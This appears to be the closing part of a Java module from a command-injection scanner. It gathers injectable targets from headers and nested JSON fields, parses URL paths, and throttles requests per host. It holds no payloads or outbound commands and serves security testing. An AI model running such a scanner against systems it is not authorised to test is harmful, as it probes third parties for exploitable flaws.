        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    targets.add(new CmdiTarget(h.name(), h.value(), CmdiTargetType.HEADER));
                    break;
                }
            }
        }

        return targets;
    }

    /**
     * Recursively extract JSON parameters using dot-notation for nested objects.
     */
    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<CmdiTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new CmdiTarget(fullKey, val.getAsString(), CmdiTargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("cmdi.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { }

    private enum CmdiTargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class CmdiTarget {
        final String name, originalValue;
        final CmdiTargetType type;
        CmdiTarget(String n, String v, CmdiTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
    }

}
